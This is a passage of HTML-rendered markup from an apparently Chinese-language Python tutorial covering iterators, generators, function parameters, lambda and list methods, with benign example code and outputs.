class=\"token punctuation\">(</span>myiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>myiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n1\n2\n3\n4\n5\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"StopIteration\"><a href=\"#StopIteration\" class=\"headerlink\" title=\"StopIteration\"></a>StopIteration</h3><p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyNumbers</span><span class=\"token punctuation\">:</span>\n  <span class=\"token keyword\">def</span> <span class=\"token function\">__iter__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">return</span> self\n \n  <span class=\"token keyword\">def</span> <span class=\"token function\">__next__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">&lt;=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">:</span>\n      x <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>a\n      self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n      <span class=\"token keyword\">return</span> x\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">raise</span> StopIteration\n \nmyclass <span class=\"token operator\">=</span> MyNumbers<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nmyiter <span class=\"token operator\">=</span> <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span>myclass<span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> myiter<span class=\"token punctuation\">:</span>\n  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"生成器\"><a href=\"#生成器\" class=\"headerlink\" title=\"生成器\"></a>生成器</h3><p>使用<code>yield()</code>函数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">fibonacci</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 生成器函数 - 斐波那契</span>\n    a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> counter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>counter <span class=\"token operator\">&gt;</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n            <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">yield</span> a\n        a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">+</span> b\n        counter <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\nf <span class=\"token operator\">=</span> fibonacci<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># f 是一个迭代器，由生成器返回生成</span>\n \n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> StopIteration<span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n<span class=\"token triple-quoted-string string\">'''\n0 1 1 2 3 5 8 13 21 34 55 \n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"函数-4\"><a href=\"#函数-4\" class=\"headerlink\" title=\"函数\"></a>函数</h2><ol>\n<li>函数代码块以def关键字开头，厚街函数标识符名称和圆括号()</li>\n<li>传入的参数和自变量放在圆括号内</li>\n<li>函数内容以冒号起始，并且缩进</li>\n<li>return [表达式] 结束函数并返回值</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 计算面积函数</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">area</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> width <span class=\"token operator\">*</span> height\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">print_welcome</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span>\n \nprint_welcome<span class=\"token punctuation\">(</span><span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">)</span>\nw <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\nh <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"width =\"</span><span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> <span class=\"token string\">\" height =\"</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">,</span> <span class=\"token string\">\" area =\"</span><span class=\"token punctuation\">,</span> area<span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数调用\"><a href=\"#函数调用\" class=\"headerlink\" title=\"函数调用\"></a>函数调用</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">print_welcome<span class=\"token punctuation\">(</span><span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">)</span>\narea<span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span>\nexit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"参数传递\"><a href=\"#参数传递\" class=\"headerlink\" title=\"参数传递\"></a>参数传递</h3><h4 id=\"不可变类型\"><a href=\"#不可变类型\" class=\"headerlink\" title=\"不可变类型\"></a>不可变类型</h4><p>number，string，tuples</p>\n<ol>\n<li>先赋值<code>a = 2</code>，再赋值<code>a = 5</code>，后者覆盖前者，相当于新生成一个值，地址变了</li>\n<li>传递的参数值不会影响原值，函数内部重新赋值会生成一个的对象，不会影响函数外的值</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 指向的是同一个对象</span>\n    a<span class=\"token operator\">=</span><span class=\"token number\">10</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 一个新对象</span>\n \na<span class=\"token operator\">=</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nchange<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n140721657271968-\n140721657271968\n140721657272256\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"可变类型\"><a href=\"#可变类型\" class=\"headerlink\" title=\"可变类型\"></a>可变类型</h4><p>list，dictionary，set</p>\n<ol>\n<li>列表赋值，然后再修改元素，列表地址不会改变，还是原来那个列表</li>\n<li>传入函数的这类参数，在函数内修改会影响到函数外的值</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">changeme</span><span class=\"token punctuation\">(</span>mylist<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"修改传入的列表\"\"\"</span>\n    mylist<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"函数内取值: \"</span><span class=\"token punctuation\">,</span> mylist<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span>\n\n\n<span class=\"token comment\"># 调用changeme函数</span>\nmylist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">]</span>\nchangeme<span class=\"token punctuation\">(</span>mylist<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"函数外取值: \"</span><span class=\"token punctuation\">,</span> mylist<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n函数内取值:  [10, 20, 30, [1, 2, 3, 4]]\n函数外取值:  [10, 20, 30, [1, 2, 3, 4]]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h3><h4 id=\"必需参数\"><a href=\"#必需参数\" class=\"headerlink\" title=\"必需参数\"></a>必需参数</h4><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">printme</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">str</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"打印任何传入的字符串\"</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span>\n \n<span class=\"token comment\"># 调用 printme 函数，不加参数会报错</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\nprintme<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"关键字参数\"><a href=\"#关键字参数\" class=\"headerlink\" title=\"关键字参数\"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值，使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">printinfo</span><span class=\"token punctuation\">(</span> name<span class=\"token punctuation\">,</span> age <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"打印任何传入的字符串\"</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"名字: \"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"年龄: \"</span><span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span>\n \n<span class=\"token comment\">#调用printinfo函数</span>\nprintinfo<span class=\"token punctuation\">(</span> age<span class=\"token operator\">=</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"runoob\"</span> <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"默认参数\"><a href=\"#默认参数\" class=\"headerlink\" title=\"默认参数\"></a>默认参数</h4><p>调用函数时，如果没有传递参数，则会使用默认参数。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">printinfo</span><span class=\"token punctuation\">(</span> name<span class=\"token punctuation\">,</span> age <span class=\"token operator\">=</span> <span class=\"token number\">35</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"打印任何传入的字符串\"</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"名字: \"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"年龄: \"</span><span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span>\n \n<span class=\"token comment\">#调用printinfo函数</span>\nprintinfo<span class=\"token punctuation\">(</span> age<span class=\"token operator\">=</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"runoob\"</span> <span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"------------------------\"</span><span class=\"token punctuation\">)</span>\nprintinfo<span class=\"token punctuation\">(</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"runoob\"</span> <span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n名字:  runoob\n年龄:  50\n------------------------\n名字:  runoob\n年龄:  35\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"不定长参数\"><a href=\"#不定长参数\" class=\"headerlink\" title=\"不定长参数\"></a>不定长参数</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">functionname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>formal_args<span class=\"token punctuation\">,</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span>var_args_tuple <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"函数_文档字符串\"</span>\n   function_suite\n   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>expression<span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">functionname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>formal_args<span class=\"token punctuation\">,</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">**</span>var_args_dict <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"函数_文档字符串\"</span>\n   function_suite\n   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>expression<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数</li>\n<li>在函数调用时没有指定参数，它就是一个空元组</li>\n<li>加了两个星号 *<strong>*</strong> 的参数会以字典的形式导入</li>\n<li>如果单独出现星号 ***** 后的参数必须用关键字传入</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">printinfo</span><span class=\"token punctuation\">(</span> arg1<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>vartuple <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"打印任何传入的参数\"</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"输出: \"</span><span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">for</span> var <span class=\"token keyword\">in</span> vartuple<span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span>\n \n<span class=\"token comment\"># 调用printinfo 函数</span>\nprintinfo<span class=\"token punctuation\">(</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span>\nprintinfo<span class=\"token punctuation\">(</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span> <span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n输出: \n10\n输出: \n70\n60\n50\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">printinfo</span><span class=\"token punctuation\">(</span> arg1<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>vardict <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token string\">\"打印任何传入的参数\"</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"输出: \"</span><span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>vardict<span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\"># 调用printinfo 函数</span>\nprintinfo<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n输出: \n1\n{'a': 2, 'b': 3}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"匿名函数\"><a href=\"#匿名函数\" class=\"headerlink\" title=\"匿名函数\"></a>匿名函数</h3><ol>\n<li>使用 lambda 来创建匿名函数</li>\n<li>lambda的主体是一个表达式，而不是一个代码块</li>\n<li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">lambda</span> <span class=\"token punctuation\">[</span>arg1 <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>argn<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>expression<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> arg1<span class=\"token punctuation\">,</span> arg2<span class=\"token punctuation\">:</span> arg1 <span class=\"token operator\">+</span> arg2\n \n<span class=\"token comment\"># 调用sum函数</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"相加后的值为 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"相加后的值为 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n相加后的值为 :  30\n相加后的值为 :  40\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"return语句\"><a href=\"#return语句\" class=\"headerlink\" title=\"return语句\"></a>return语句</h3><p><strong>return [表达式]</strong> 语句用于退出函数，选择性地向调用方返回一个表达式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span> arg1<span class=\"token punctuation\">,</span> arg2 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   <span class=\"token comment\"># 返回2个参数的和.\"</span>\n   total <span class=\"token operator\">=</span> arg1 <span class=\"token operator\">+</span> arg2\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"函数内 : \"</span><span class=\"token punctuation\">,</span> total<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span> total\n \n<span class=\"token comment\"># 调用sum函数</span>\ntotal <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span> <span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"函数外 : \"</span><span class=\"token punctuation\">,</span> total<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n函数内 :  30\n函数外 :  30\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"强制位置参数\"><a href=\"#强制位置参数\" class=\"headerlink\" title=\"强制位置参数\"></a>强制位置参数</h3><p>函数形参语法 / 用来指明函数形参必须使用指定位置参数，不能使用关键字参数的形式。</p>\n<p>形参 a 和 b 必须使用指定位置参数，c 或 d 可以是位置形参或关键字形参，而 e 和 f 要求为关键字形参</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> d<span class=\"token operator\">=</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> e<span class=\"token operator\">=</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> f<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n10 20 30 40 50 60\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h2><h3 id=\"列表-1\"><a href=\"#列表-1\" class=\"headerlink\" title=\"列表\"></a>列表</h3><table>\n<thead>\n<tr>\n<th align=\"left\">方法</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">list.append(x)</td>\n<td align=\"left\">把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。</td>\n</tr>\n<tr>\n<td align=\"left\">list.extend(L)</td>\n<td align=\"left\">通过添加指定列表的所有元素来扩充列表，相当于 a[len(a):] = L。</td>\n</tr>\n<tr>\n<td align=\"left\">list.insert(i, x)</td>\n<td align=\"left\">在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(0, x) 会插入到整个列表之前，而 a.insert(len(a), x) 相当于 a.append(x) 。</td>\n</tr>\n<tr>\n<td align=\"left\">list.remove(x)</td>\n<td align=\"left\">删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。</td>\n</tr>\n<tr>\n<td align=\"left\">list.pop([i])</td>\n<td align=\"left\">从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）</td>\n</tr>\n<tr>\n<td align=\"left\">list.clear()</td>\n<td align=\"left\">移除列表中的所有项，等于del a[:]。</td>\n</tr>\n<tr>\n<td align=\"left\">list.index(x)</td>\n<td align=\"left\">返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。</td>\n</tr>\n<tr>\n<td align=\"left\">list.count(x)</td>\n<td align=\"left\">返回 x 在列表中出现的次数。</td>\n</tr>\n<tr>\n<td align=\"left\">list.sort()</td>\n<td align=\"left\">对列表中的元素进行排序。</td>\n</tr>\n<tr>\n<td align=\"left\">list.reverse()</td>\n<td align=\"left\">倒排列表中的元素。</td>\n</tr>\n<tr>\n<td align=\"left\">list.copy()</td>\n<td align=\"left\">返回列表的浅复制，等于a[:]。</td>\n</tr>\n</tbody></table>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span 